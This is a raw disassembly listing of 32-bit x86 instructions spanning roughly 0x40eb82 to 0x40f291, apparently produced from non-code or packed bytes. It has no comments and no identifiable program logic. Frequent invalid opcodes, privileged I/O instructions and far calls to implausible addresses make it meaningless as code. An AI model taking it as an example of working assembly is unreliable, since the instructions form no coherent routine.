  40eb82:	jl     0x40eb9e
  40eb84:	sub    eax,0x18475537
  40eb89:	jns    0x40ebfb
  40eb8b:	xor    ah,ch
  40eb8d:	dec    ebp
  40eb8e:	or     dl,al
  40eb90:	push   edx
  40eb91:	jo     0x40eb73
  40eb93:	sbb    al,0x1a
  40eb95:	idiv   ebx
  40eb97:	sbb    bl,ch
  40eb99:	iret   
  40eb9a:	data16 or al,0xca
  40eb9d:	xor    BYTE PTR [edi],ah
  40eb9f:	jle    0x40eb5c
  40eba1:	scas   al,BYTE PTR es:[edi]
  40eba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba3:	fstp   QWORD PTR [esi+eiz*8]
  40eba6:	mov    dh,0x63
  40eba8:	popf   
  40eba9:	xor    edx,DWORD PTR [edi+edi*2+0x29]
  40ebad:	mov    cl,0xb7
  40ebaf:	push   ecx
  40ebb0:	mov    bl,0x80
  40ebb2:	push   eax
  40ebb3:	add    BYTE PTR [eax+0x67],dl
  40ebb6:	adc    dl,BYTE PTR [edi+0xa]
  40ebb9:	cdq    
  40ebba:	inc    esp
  40ebbb:	pushf  
  40ebbc:	or     edx,ebx
  40ebbe:	and    BYTE PTR [ecx],dh
  40ebc0:	pop    esi
  40ebc1:	jp     0x40ebc6
  40ebc3:	hlt    
  40ebc4:	cmp    DWORD PTR [ebx-0x7c],ebx
  40ebc7:	pop    ecx
  40ebc8:	les    ebp,FWORD PTR [eax-0x73afe190]
  40ebce:	and    BYTE PTR [ebx],0x2
  40ebd1:	push   esp
  40ebd2:	jb     0x40ebb6
  40ebd4:	scas   al,BYTE PTR es:[edi]
  40ebd5:	stos   BYTE PTR es:[edi],al
  40ebd6:	test   eax,0x220dc82e
  40ebdb:	jae    0x40eb66
  40ebdd:	xor    eax,0x72d53664
  40ebe2:	stos   DWORD PTR es:[edi],eax
  40ebe3:	mov    edx,0xb35dd28c
  40ebe8:	lods   eax,DWORD PTR ds:[esi]
  40ebe9:	ins    BYTE PTR es:[edi],dx
  40ebea:	mov    dh,0xd9
  40ebec:	data16 loop 0x40ebdf
  40ebef:	test   BYTE PTR [ebx-0x7651c35c],dh
  40ebf5:	inc    edi
  40ebf6:	inc    esp
  40ebf7:	sahf   
  40ebf8:	iret   
  40ebf9:	xor    eax,0x4d2050a1
  40ebfe:	push   edi
  40ebff:	loopne 0x40ebde
  40ec01:	inc    esp
  40ec02:	dec    edi
  40ec03:	ss inc esp
  40ec05:	adc    dl,al
  40ec07:	mov    ds:0xbf73e3f6,al
  40ec0c:	out    dx,al
  40ec0d:	mov    eax,ds:0x1ea9e599
  40ec12:	pop    esi
  40ec13:	sbb    edi,DWORD PTR [edi]
  40ec15:	rol    BYTE PTR [esi+0x182a205c],1
  40ec1b:	lea    eax,[ebx-0x30402c8b]
  40ec21:	jbe    0x40ec1f
  40ec23:	daa    
  40ec24:	dec    ebp
  40ec25:	cmp    al,0x18
  40ec27:	jb     0x40ec44
  40ec29:	cmp    bh,BYTE PTR [ebx+0x14803c9c]
  40ec2f:	inc    esp
  40ec30:	or     BYTE PTR [ebp-0x1a],bl
  40ec33:	std    
  40ec34:	in     eax,dx
  40ec35:	cmp    eax,DWORD PTR [ebx-0x30]
  40ec38:	xchg   ecx,esi
  40ec3a:	popf   
  40ec3b:	(bad)  
  40ec3d:	pop    ebp
  40ec3e:	dec    esi
  40ec3f:	sub    BYTE PTR [ecx],0x76
  40ec42:	pop    ebp
  40ec43:	dec    edi
  40ec44:	mov    edi,eax
  40ec46:	mov    esp,edx
  40ec48:	pop    eax
  40ec49:	ins    DWORD PTR es:[edi],dx
  40ec4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec4b:	or     ecx,DWORD PTR [ebx+0x21dbd79]
  40ec51:	mov    al,cl
  40ec53:	mov    cl,BYTE PTR [esi-0x68]
  40ec56:	pop    eax
  40ec57:	scas   eax,DWORD PTR es:[edi]
  40ec58:	sbb    al,0xc4
  40ec5a:	xchg   ecx,eax
  40ec5b:	leave  
  40ec5c:	inc    ecx
  40ec5d:	imul   ecx,esi,0x1a
  40ec60:	jnp    0x8e079784
  40ec66:	inc    ebp
  40ec67:	and    ah,BYTE PTR ds:0xad803a7d
  40ec6d:	(bad)  
  40ec6e:	pop    ebx
  40ec6f:	iret   
  40ec70:	push   ss
  40ec71:	and    BYTE PTR [edi-0x599d1a3a],al
  40ec77:	dec    edi
  40ec78:	push   esp
  40ec79:	(bad)  
  40ec7a:	out    0x64,al
  40ec7c:	adc    ah,bh
  40ec7e:	call   0x3033:0xa012c1c3
  40ec85:	stos   BYTE PTR es:[edi],al
  40ec86:	(bad)  
  40ec87:	outs   dx,DWORD PTR ds:[esi]
  40ec88:	xlat   BYTE PTR ds:[ebx]
  40ec89:	mov    DWORD PTR [esi+0x4a48b73b],ecx
  40ec8f:	mov    DWORD PTR [esi+0x3f6f132c],esp
  40ec95:	loope  0x40ed0f
  40ec97:	mov    cl,0x20
  40ec99:	fscale 
  40ec9b:	cmp    eax,ecx
  40ec9d:	sub    DWORD PTR [ecx],esi
  40ec9f:	dec    eax
  40eca0:	jnp    0x40ec6d
  40eca2:	or     ebp,ebp
  40eca4:	xchg   edx,eax
  40eca5:	pop    es
  40eca6:	jmp    0x40ec29
  40eca8:	lods   eax,DWORD PTR ds:[esi]
  40eca9:	mov    ch,0xe9
  40ecab:	adc    bh,BYTE PTR [esi-0x59]
  40ecae:	dec    edi
  40ecaf:	ret    0xd2ea
  40ecb2:	jmp    0x40eceb
  40ecb4:	sbb    eax,0x26020143
  40ecb9:	mov    ds:0x6abb563c,eax
  40ecbe:	sbb    BYTE PTR [esi-0x1a],bh
  40ecc1:	in     al,0x1e
  40ecc3:	daa    
  40ecc4:	clc    
  40ecc5:	mov    dl,0x7
  40ecc7:	xchg   ebp,eax
  40ecc8:	aaa    
  40ecc9:	das    
  40ecca:	inc    eax
  40eccb:	(bad)  
  40eccc:	aas    
  40eccd:	xchg   edi,eax
  40ecce:	push   0xcb0d55b4
  40ecd3:	push   esp
  40ecd4:	and    eax,ebp
  40ecd6:	pop    edx
  40ecd7:	retf   0x58bd
  40ecda:	mov    al,ds:0x78edf02b
  40ecdf:	inc    edi
  40ece0:	ret    
  40ece1:	cmp    al,0xcf
  40ece3:	sbb    BYTE PTR [ecx],ch
  40ece5:	jno    0x40ec9c
  40ece7:	jge    0x40ec80
  40ece9:	rcl    DWORD PTR [eax+eiz*8+0x2],1
  40eced:	sub    bl,ch
  40ecef:	cmp    esi,DWORD PTR [esi+ebp*2+0x540277dd]
  40ecf6:	add    eax,0x6122eb52
  40ecfb:	mov    ch,0xa1
  40ecfd:	xchg   esi,ebx
  40ecff:	mov    cl,0x0
  40ed01:	mov    edi,0xfa947efa
  40ed06:	jl     0x40ed03
  40ed08:	ror    edx,cl
  40ed0a:	pop    eax
  40ed0b:	pop    ss
  40ed0c:	push   esp
  40ed0d:	cld    
  40ed0e:	fwait
  40ed0f:	dec    esi
  40ed10:	hlt    
  40ed11:	pop    ebx
  40ed12:	hlt    
  40ed13:	adc    DWORD PTR [ebp-0x44],0xffffff85
  40ed17:	ins    DWORD PTR es:[edi],dx
  40ed18:	mov    ah,0x45
  40ed1a:	jmp    0x396577ca
  40ed1f:	pushf  
  40ed20:	mov    al,0xd3
  40ed22:	les    esp,FWORD PTR ds:0x1624b49b
  40ed28:	or     ebx,DWORD PTR [eax-0x47]
  40ed2b:	inc    ebx
  40ed2c:	mov    bl,0xab
  40ed2e:	dec    ebx
  40ed2f:	lock retf 0xbb66
  40ed33:	mov    edx,0xa79033cd
  40ed38:	ins    BYTE PTR es:[edi],dx
  40ed39:	and    DWORD PTR [edx],ecx
  40ed3b:	mov    al,0x34
  40ed3d:	sub    DWORD PTR [ebx+0x32],eax
  40ed40:	pop    ds
  40ed41:	or     BYTE PTR [esi-0x1c],bl
  40ed44:	xchg   ebp,eax
  40ed45:	(bad)  
  40ed46:	adc    BYTE PTR [eax],ah
  40ed48:	dec    ebp
  40ed49:	scas   al,BYTE PTR es:[edi]
  40ed4a:	add    bh,ah
  40ed4c:	sub    bl,BYTE PTR [ebp-0x61]
  40ed4f:	fdiv   DWORD PTR [esi]
  40ed51:	xchg   ecx,eax
  40ed52:	jl     0x40ed7a
  40ed54:	jns    0x40ed00
  40ed56:	jmp    0x40ed9f
  40ed58:	loope  0x40ed13
  40ed5a:	xchg   ebx,eax
  40ed5b:	(bad)  
  40ed5c:	xor    ch,bl
  40ed5e:	jecxz  0x40ed3e
  40ed60:	sub    al,0x71
  40ed62:	arpl   bx,cx
  40ed64:	into   
  40ed65:	mov    WORD PTR [esi+0xbb777fe],fs
  40ed6b:	out    dx,eax
  40ed6c:	and    ch,BYTE PTR [ecx+0x19ed637e]
  40ed72:	and    al,0x58
  40ed74:	hlt    
  40ed75:	push   ebp
  40ed76:	xor    BYTE PTR [esi],ch
  40ed78:	sbb    al,0x34
  40ed7a:	pop    ebp
  40ed7b:	adc    eax,0xcb6207dd
  40ed80:	add    esp,DWORD PTR [esi]
  40ed82:	les    ecx,FWORD PTR [ebp+0x72977e90]
  40ed88:	pop    es
  40ed89:	ins    DWORD PTR es:[edi],dx
  40ed8a:	js     0x40edfc
  40ed8c:	mov    bl,0xd0
  40ed8e:	adc    al,0x67
  40ed90:	cmp    BYTE PTR [esi+eiz*4-0x2bc1f11a],0xd
  40ed98:	std    
  40ed99:	pushf  
  40ed9a:	cmc    
  40ed9b:	ffreep st(0)
  40ed9d:	sahf   
  40ed9e:	pusha  
  40ed9f:	mov    ah,0x6d
  40eda1:	jns    0x40ee18
  40eda3:	jecxz  0x40ed56
  40eda5:	std    
  40eda6:	sbb    al,dl
  40eda8:	jno    0x40ee02
  40edaa:	mov    bh,0x45
  40edac:	push   edx
  40edad:	mov    eax,0xb4b8d6e5
  40edb2:	push   ebx
  40edb3:	arpl   di,ax
  40edb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb6:	shl    DWORD PTR [edi+0x1],1
  40edb9:	push   cs
  40edba:	(bad)  [ecx]
  40edbc:	outs   dx,DWORD PTR ds:[esi]
  40edbd:	das    
  40edbe:	(bad)  
  40edbf:	aad    0x17
  40edc1:	scas   eax,DWORD PTR es:[edi]
  40edc2:	add    eax,0x8b2f662a
  40edc7:	push   esi
  40edc8:	xor    dl,BYTE PTR [edx+0x45ea9f1b]
  40edce:	(bad)  
  40edcf:	mov    cl,0x3e
  40edd1:	dec    ebp
  40edd2:	loop   0x40ed89
  40edd4:	mov    esp,DWORD PTR [esi]
  40edd6:	ror    DWORD PTR [ebx-0x7f],1
  40edd9:	inc    ebp
  40edda:	add    DWORD PTR ds:0xdab1907b,edx
  40ede0:	(bad)  
  40ede1:	and    BYTE PTR [ecx+edi*2-0x37e8292d],ah
  40ede8:	pop    esp
  40ede9:	mov    ah,0xa2
  40edeb:	mov    al,ds:0xac0edb8e
  40edf0:	mov    bl,0xbc
  40edf2:	inc    edx
  40edf3:	clc    
  40edf4:	mov    al,0xc3
  40edf6:	jno    0x40edac
  40edf8:	inc    esi
  40edf9:	xchg   ebx,eax
  40edfa:	call   0x5b7c0793
  40edff:	imul   esi,ebx,0x4
  40ee02:	call   0x8301:0x4eeeccec
  40ee09:	inc    eax
  40ee0a:	sbb    eax,DWORD PTR [esi]
  40ee0c:	icebp  
  40ee0d:	(bad)  
  40ee0e:	sbb    DWORD PTR [ecx-0x6eb669cf],edx
  40ee14:	jmp    0xe7248e8c
  40ee19:	rcr    al,1
  40ee1b:	cmc    
  40ee1c:	mov    edi,?
  40ee1e:	push   es
  40ee1f:	iret   
  40ee20:	test   al,0x44
  40ee22:	frstor [ebx+0x1a]
  40ee25:	fld    QWORD PTR [eax-0x2c]
  40ee28:	(bad)  
  40ee29:	dec    ecx
  40ee2a:	add    BYTE PTR [ecx],0xb8
  40ee2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee2e:	xchg   DWORD PTR [esi],edi
  40ee30:	loope  0x40ee49
  40ee32:	call   0xdb23:0xc449806a
  40ee39:	mov    esi,0xd89df59b
  40ee3e:	sbb    al,0xe8
  40ee40:	loopne 0x40edf1
  40ee42:	cmp    BYTE PTR [edi-0x53],cl
  40ee45:	aas    
  40ee46:	push   eax
  40ee47:	std    
  40ee48:	es dec esp
  40ee4a:	scas   al,BYTE PTR es:[edi]
  40ee4b:	shl    esp,cl
  40ee4d:	xor    ebp,DWORD PTR [edx+0x46]
  40ee50:	test   eax,0x4e3cd025
  40ee55:	mov    ecx,0x618853ef
  40ee5a:	pop    esp
  40ee5b:	rcr    BYTE PTR [esi-0x315a5a0f],cl
  40ee61:	cmp    ebp,ecx
  40ee63:	jle    0x40ee79
  40ee65:	sahf   
  40ee66:	push   esp
  40ee67:	adc    eax,0x59f783bb
  40ee6c:	mov    ebx,0xbddf42b2
  40ee71:	jne    0x40ee5e
  40ee73:	mov    bl,0xe7
  40ee75:	retf   
  40ee76:	sbb    BYTE PTR [ebp-0x4a78351a],ch
  40ee7c:	pop    ds
  40ee7d:	add    ah,ah
  40ee7f:	cmp    ecx,DWORD PTR [ebx-0x45b82ff3]
  40ee85:	mov    ebx,0x8ff67515
  40ee8a:	stos   DWORD PTR es:[edi],eax
  40ee8b:	xchg   ebp,eax
  40ee8c:	mov    ds:0xf3e783cb,eax
  40ee91:	mov    dl,0x88
  40ee93:	sahf   
  40ee94:	stc    
  40ee95:	sti    
  40ee96:	lock pop esi
  40ee98:	fisub  DWORD PTR [ecx+0x3]
  40ee9b:	sar    ecx,cl
  40ee9d:	(bad)  
  40ee9e:	fbld   TBYTE PTR [esi]
  40eea0:	mov    al,ds:0xb7919395
  40eea5:	mov    ah,0xbd
  40eea7:	dec    edx
  40eea8:	loopne 0x40ef27
  40eeaa:	xlat   BYTE PTR ds:[ebx]
  40eeab:	hlt    
  40eeac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eead:	push   es
  40eeae:	or     ecx,ecx
  40eeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb1:	rol    BYTE PTR [edi-0xc],0x37
  40eeb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeb6:	mov    ebp,0xdf2a714e
  40eebb:	jno    0x40ee75
  40eebd:	add    BYTE PTR [esp+eiz*2-0x5b705f13],cl
  40eec4:	in     eax,0xda
  40eec6:	mov    al,0x35
  40eec8:	ins    BYTE PTR es:[edi],dx
  40eec9:	mov    al,0x23
  40eecb:	(bad)  
  40eecc:	enter  0x4338,0x8f
  40eed0:	push   0xb830ee80
  40eed5:	inc    esp
  40eed6:	shl    BYTE PTR [eax],1
  40eed8:	cmp    eax,0x7e6706bd
  40eedd:	loope  0x40eea8
  40eedf:	std    
  40eee0:	xor    ch,BYTE PTR [ebp+0x63adbd33]
  40eee6:	inc    eax
  40eee7:	iret   
  40eee8:	jmp    0xfbec:0xdf54272b
  40eeef:	std    
  40eef0:	ficom  WORD PTR [ebp-0x1463ff61]
  40eef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef7:	adc    edi,ecx
  40eef9:	and    BYTE PTR [ecx-0x80],0xd6
  40eefd:	es sahf 
  40eeff:	inc    ebp
  40ef00:	adc    al,0x89
  40ef02:	js     0x40eeae
  40ef04:	xchg   ebp,eax
  40ef05:	sbb    BYTE PTR [ecx],bh
  40ef07:	dec    edx
  40ef08:	icebp  
  40ef09:	int3   
  40ef0a:	mov    dh,0xb8
  40ef0c:	jmp    0x419ab489
  40ef11:	pop    esp
  40ef12:	sbb    eax,0x9cc89d96
  40ef17:	sub    cl,dh
  40ef19:	les    esi,FWORD PTR [ebp+0x42]
  40ef1c:	not    BYTE PTR [esp+edx*8+0x44]
  40ef20:	mov    eax,0x15ed404f
  40ef25:	repz push edi
  40ef27:	jno    0x40ef4f
  40ef29:	jmp    0x40ef61
  40ef2b:	das    
  40ef2c:	ror    DWORD PTR [eax+ecx*4],cl
  40ef2f:	icebp  
  40ef30:	sbb    DWORD PTR [ebx],ebx
  40ef32:	pop    esp
  40ef33:	scas   eax,DWORD PTR es:[edi]
  40ef34:	loop   0x40eef5
  40ef36:	pop    ecx
  40ef37:	cmp    al,0x86
  40ef39:	adc    eax,0xfbbdc67
  40ef3e:	sub    eax,0xb9aca5d2
  40ef43:	mov    dl,0x29
  40ef45:	rcr    dl,0xb3
  40ef48:	fldcw  WORD PTR [edi-0x5a]
  40ef4b:	nop
  40ef4c:	jmp    eax
  40ef4e:	mov    ds:0xdc7da55f,al
  40ef53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef54:	retf   0x5652
  40ef57:	call   0x4b51:0x1946fdeb
  40ef5e:	inc    eax
  40ef5f:	push   eax
  40ef60:	xor    al,0x5d
  40ef62:	test   eax,0xcba1d7bc
  40ef67:	test   DWORD PTR [eax],eax
  40ef69:	inc    ebx
  40ef6a:	adc    esi,DWORD PTR [edx]
  40ef6c:	enter  0x4e38,0xfa
  40ef70:	in     al,dx
  40ef71:	jg     0x40ef4e
  40ef73:	scas   al,BYTE PTR es:[edi]
  40ef74:	imul   ebp,DWORD PTR [eax-0x6329a24e],0x2a2ce20f
  40ef7e:	hlt    
  40ef7f:	push   eax
  40ef80:	cmp    BYTE PTR [ebx],dh
  40ef82:	mov    dh,0xbf
  40ef84:	push   ebx
  40ef85:	push   ecx
  40ef86:	shl    cl,1
  40ef88:	pop    edi
  40ef89:	or     ecx,ebx
  40ef8b:	jle    0x40efa6
  40ef8d:	shr    BYTE PTR [ecx],0x9
  40ef90:	mov    ah,0xa4
  40ef92:	push   0xad88a89c
  40ef97:	adc    dh,BYTE PTR es:[ebp+ebx*4-0x6b59d4c9]
  40ef9f:	cmp    ecx,DWORD PTR [edx+0x167763c2]
  40efa5:	inc    BYTE PTR [ecx-0x7f633687]
  40efab:	push   esp
  40efac:	push   edx
  40efad:	cdq    
  40efae:	jbe    0x40efbf
  40efb0:	push   es
  40efb1:	pop    edx
  40efb2:	mov    edx,0xddd98928
  40efb7:	rcr    DWORD PTR [ebx-0x7d7714a3],0x1a
  40efbe:	pop    ecx
  40efbf:	or     ecx,DWORD PTR [eax]
  40efc1:	shl    DWORD PTR [eax+0x498fb74a],cl
  40efc7:	add    ebx,0xbbb3e607
  40efcd:	pop    esi
  40efce:	dec    esp
  40efcf:	aaa    
  40efd0:	mov    ecx,0x708763e4
  40efd5:	jae    0x40f04b
  40efd7:	or     dl,bl
  40efd9:	or     BYTE PTR [esi],bl
  40efdb:	mov    ch,0x96
  40efdd:	or     al,0xc9
  40efdf:	hlt    
  40efe0:	hlt    
  40efe1:	mov    bh,0xa9
  40efe3:	lods   al,BYTE PTR ds:[esi]
  40efe4:	int3   
  40efe5:	imul   ebx,DWORD PTR [edi+0x19],0x1
  40efe9:	lods   al,BYTE PTR ds:[esi]
  40efea:	pop    edi
  40efeb:	gs ret 
  40efed:	cmp    al,0xa5
  40efef:	(bad)  
  40eff0:	js     0x40efae
  40eff2:	dec    ebp
  40eff3:	mov    esp,DWORD PTR [esi-0x36]
  40eff6:	xchg   esi,eax
  40eff7:	inc    ebp
  40eff8:	fs scas eax,DWORD PTR es:[edi]
  40effa:	push   0xb478165c
  40efff:	mov    ebp,0x1e91fae0
  40f004:	add    dh,bl
  40f006:	or     ch,ch
  40f008:	mov    WORD PTR [esi],?
  40f00a:	mov    ds:0xf3c2c5ed,al
  40f00f:	enter  0xc77c,0x6a
  40f013:	dec    ecx
  40f014:	pop    ecx
  40f015:	scas   eax,DWORD PTR es:[edi]
  40f016:	inc    edi
  40f017:	daa    
  40f018:	sub    al,0xa8
  40f01a:	pop    ds
  40f01b:	je     0x40f052
  40f01d:	mov    ebp,0xcd0a75e8
  40f022:	add    dl,dh
  40f024:	jg     0x40f045
  40f026:	gs cmp ch,dl
  40f029:	mov    esp,ebx
  40f02b:	or     DWORD PTR [ebp+esi*2+0x7d],ebp
  40f02f:	les    edx,FWORD PTR [ebx+0x46]
  40f032:	mov    WORD PTR [edx],cs
  40f034:	inc    eax
  40f035:	pop    edx
  40f036:	into   
  40f037:	das    
  40f038:	lea    eax,[ebp-0x6e8ee2e9]
  40f03e:	lods   eax,DWORD PTR ds:[esi]
  40f03f:	arpl   bp,dx
  40f041:	or     ebx,0xffffffb6
  40f044:	or     al,0xc9
  40f046:	clc    
  40f047:	pop    esi
  40f048:	mov    al,BYTE PTR [eax]
  40f04a:	imul   ecx,DWORD PTR [edi-0x65],0xa0f44110
  40f051:	fld    TBYTE PTR [ebx-0x5e]
  40f054:	xor    esi,DWORD PTR [edx-0x12861d8a]
  40f05a:	repnz cmp BYTE PTR [edi-0x417c5fcd],ah
  40f061:	push   ebx
  40f062:	(bad)  
  40f064:	sti    
  40f065:	imul   esi,DWORD PTR [ebp-0x38],0x5bc048c9
  40f06c:	in     eax,0x26
  40f06e:	xchg   edi,eax
  40f06f:	mov    bl,0xe
  40f071:	hlt    
  40f072:	pop    eax
  40f073:	xor    eax,0x56b0bd3a
  40f078:	fisttp WORD PTR [esi-0x53]
  40f07b:	adc    eax,0xc61c9f48
  40f080:	mov    al,ds:0x6aacc8ee
  40f085:	in     eax,0x6
  40f087:	in     eax,dx
  40f088:	outs   dx,DWORD PTR ds:[esi]
  40f089:	jp     0x40f0e0
  40f08b:	in     eax,0x46
  40f08d:	outs   dx,DWORD PTR ds:[esi]
  40f08e:	jae    0x40f0ac
  40f090:	out    dx,eax
  40f091:	jmp    0x40f03b
  40f093:	xor    al,0x21
  40f095:	stos   DWORD PTR es:[edi],eax
  40f096:	mov    ecx,cs
  40f098:	push   esi
  40f099:	sbb    DWORD PTR [edi+0x7e],esi
  40f09c:	xchg   esp,eax
  40f09d:	out    dx,al
  40f09e:	sub    BYTE PTR [ecx],dl
  40f0a0:	push   edi
  40f0a1:	(bad)
  40f0a4:	jo     0x40f0ed
  40f0a6:	push   cs
  40f0a7:	mov    esp,0xa5aab6f9
  40f0ac:	mov    ds:0xb96b630b,al
  40f0b1:	cmp    eax,0xbbb55574
  40f0b6:	shl    ch,0x58
  40f0b9:	mov    eax,ebp
  40f0bb:	mov    ch,0xc3
  40f0bd:	out    dx,eax
  40f0be:	xor    dl,BYTE PTR [ebp+0xc61475c]
  40f0c4:	iret   
  40f0c5:	std    
  40f0c6:	pop    esp
  40f0c7:	sub    esp,DWORD PTR [ecx]
  40f0c9:	enter  0x94e4,0x4b
  40f0cd:	jae    0x40f06f
  40f0cf:	pop    esi
  40f0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0d1:	jae    0x40f0b8
  40f0d3:	mov    dh,0xbf
  40f0d5:	repnz xchg esi,eax
  40f0d7:	push   es
  40f0d8:	mov    bl,0xb3
  40f0da:	pop    ds
  40f0db:	mov    eax,0xb6b65381
  40f0e0:	sbb    eax,0xda8b3a77
  40f0e5:	ja     0x40f0dc
  40f0e7:	call   0x85870511
  40f0ec:	xchg   ebx,eax
  40f0ed:	call   0xb29d:0x4b50146f
  40f0f4:	cwde   
  40f0f5:	fisttp QWORD PTR [ebp-0x68c90f99]
  40f0fb:	sub    BYTE PTR [edx+0x73],dh
  40f0fe:	jg     0x40f09b
  40f100:	aad    0xa1
  40f102:	push   0xb72de6de
  40f107:	xchg   edx,eax
  40f108:	enter  0xa274,0x45
  40f10c:	pusha  
  40f10d:	push   ebx
  40f10e:	xchg   DWORD PTR [ecx],esi
  40f110:	xchg   esp,eax
  40f111:	(bad)  
  40f112:	fimul  WORD PTR [edi-0x44756056]
  40f118:	add    DWORD PTR [esi],0xfeda033
  40f11e:	xchg   ebp,eax
  40f11f:	or     bh,ch
  40f121:	push   eax
  40f122:	lea    edx,[edx]
  40f124:	push   edi
  40f125:	mov    cl,0x7e
  40f127:	inc    ebp
  40f128:	retf   0x33bb
  40f12b:	scas   eax,DWORD PTR es:[edi]
  40f12c:	es mov bh,0x3
  40f12f:	dec    ebp
  40f130:	adc    edi,DWORD PTR [ecx]
  40f132:	mov    bh,0x80
  40f134:	ret    
  40f135:	adc    eax,0xa99ebc69
  40f13a:	push   esp
  40f13b:	out    dx,eax
  40f13c:	mov    ecx,0x1f30bddc
  40f141:	jb     0x40f1ab
  40f143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f144:	jns    0x40f0d7
  40f146:	sbb    DWORD PTR [ebp+0x58f1ce25],0xfcce7972
  40f150:	bswap  ebx
  40f152:	sub    esi,ebp
  40f154:	cmp    al,0xed
  40f156:	ins    BYTE PTR es:[edi],dx
  40f157:	add    esi,ebp
  40f159:	push   0x31
  40f15b:	jnp    0x40f182
  40f15d:	mov    bh,0x4d
  40f15f:	not    DWORD PTR [esi+ecx*2+0x25]
  40f163:	out    dx,eax
  40f164:	fnstenv [edi-0x17c13d7e]
  40f16a:	(bad)  
  40f16b:	cmc    
  40f16c:	pop    esi
  40f16d:	xor    edi,DWORD PTR [ebx+0x34ed48c]
  40f173:	ins    BYTE PTR es:[edi],dx
  40f174:	aam    0x69
  40f176:	clc    
  40f177:	(bad)  
  40f178:	(bad)  
  40f179:	int3   
  40f17a:	cli    
  40f17b:	xchg   esp,eax
  40f17c:	or     al,0x46
  40f17e:	add    al,0x6d
  40f180:	pop    esi
  40f181:	ins    BYTE PTR es:[edi],dx
  40f182:	rol    BYTE PTR [eax],1
  40f184:	jl     0x40f1de
  40f186:	push   edi
  40f187:	js     0x40f19e
  40f189:	pop    ecx
  40f18a:	cmp    dl,BYTE PTR [edi]
  40f18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f18d:	fdivr  st(0),st
  40f18f:	mov    al,0xb8
  40f191:	jge    0x40f129
  40f193:	call   0xf6b3:0x2af6b5dc
  40f19a:	ins    DWORD PTR es:[edi],dx
  40f19b:	mov    bl,0xa8
  40f19d:	xor    ah,BYTE PTR [edi-0x5951b829]
  40f1a3:	in     eax,dx
  40f1a4:	scas   al,BYTE PTR es:[edi]
  40f1a5:	(bad)  
  40f1a7:	lods   al,BYTE PTR ds:[esi]
  40f1a8:	dec    ecx
  40f1a9:	and    al,0xfb
  40f1ab:	enter  0x6072,0xf4
  40f1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b0:	call   eax
  40f1b2:	sahf   
  40f1b3:	imul   edi,DWORD PTR [ecx-0x32],0x82887e83
  40f1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1bb:	push   esi
  40f1bc:	sub    DWORD PTR [ecx-0x1e],ecx
  40f1bf:	ror    BYTE PTR [edi+ebp*8-0x20bca650],0x9e
  40f1c7:	add    ch,cl
  40f1c9:	cli    
  40f1ca:	pop    ss
  40f1cb:	fiadd  DWORD PTR [ebx+edx*8]
  40f1ce:	mov    fs,WORD PTR [edi+0x30e4f5f8]
  40f1d4:	lods   al,BYTE PTR ds:[esi]
  40f1d5:	adc    edx,DWORD PTR [ebx+0x4a]
  40f1d8:	xor    al,0x75
  40f1da:	gs jecxz 0x40f252
  40f1dd:	push   ds
  40f1de:	js     0x40f1f7
  40f1e0:	sub    eax,0x3b026f08
  40f1e5:	dec    esp
  40f1e6:	sbb    dh,BYTE PTR [ecx-0x56e27e7e]
  40f1ec:	xor    al,0x8f
  40f1ee:	pushf  
  40f1ef:	test   BYTE PTR [ebp-0x1ec66844],0xee
  40f1f6:	add    DWORD PTR [eax-0x6],0x46a3d144
  40f1fd:	xchg   BYTE PTR [esi+0x656c16bb],al
  40f203:	adc    al,0xdf
  40f205:	jbe    0x40f259
  40f207:	dec    edx
  40f208:	js     0x40f23d
  40f20a:	add    esi,DWORD PTR [esi-0x165b9369]
  40f210:	lods   al,BYTE PTR ds:[esi]
  40f211:	aaa    
  40f212:	push   ebp
  40f213:	push   0xffffffb3
  40f215:	jecxz  0x40f1ce
  40f217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f218:	push   ecx
  40f219:	ds faddp st(1),st
  40f21c:	retf   0x9967
  40f21f:	aas    
  40f220:	nop
  40f221:	add    al,0x9f
  40f223:	jge    0x40f292
  40f225:	call   0xc6a3:0x4638597b
  40f22c:	fs xchg esi,eax
  40f22e:	pushf  
  40f22f:	icebp  
  40f230:	test   DWORD PTR [eax+ebx*1+0x5986f72f],esi
  40f237:	inc    ebp
  40f238:	sbb    ebp,DWORD PTR [edi-0x51f0a2ef]
  40f23e:	ret    
  40f23f:	ficomp DWORD PTR [eax]
  40f241:	out    0x53,eax
  40f243:	in     eax,dx
  40f244:	pop    ss
  40f245:	iret   
  40f246:	jno    0x40f245
  40f248:	jecxz  0x40f24d
  40f24a:	imul   eax,DWORD PTR [ebx+0x4c9900d2],0xffffff9f
  40f251:	or     bh,BYTE PTR [eax-0x14]
  40f254:	inc    ebx
  40f255:	mov    dl,0xc
  40f257:	add    eax,ecx
  40f259:	sahf   
  40f25a:	fwait
  40f25b:	nop
  40f25c:	push   0x8ac04af
  40f261:	cmc    
  40f262:	mov    bh,0x5b
  40f264:	push   esp
  40f265:	addr16 adc al,dh
  40f268:	in     al,0xf1
  40f26a:	fwait
  40f26b:	xchg   edi,eax
  40f26c:	add    edi,DWORD PTR [edx]
  40f26e:	inc    esi
  40f26f:	add    al,0x6c
  40f271:	pop    eax
  40f272:	pop    eax
  40f273:	in     eax,0x79
  40f275:	call   0x7f93570e
  40f27a:	sbb    eax,0xf50bc6ed
  40f27f:	(bad)  
  40f280:	(bad)  
  40f281:	jb     0x40f22c
  40f283:	(bad)  
  40f284:	sbb    ch,BYTE PTR [ecx+0x67ecaee8]
  40f28a:	repnz int3 
  40f28c:	pop    ds
  40f28d:	sar    DWORD PTR [edx-0x63],cl
  40f290:	dec    ecx
  40f291:	pop    edi
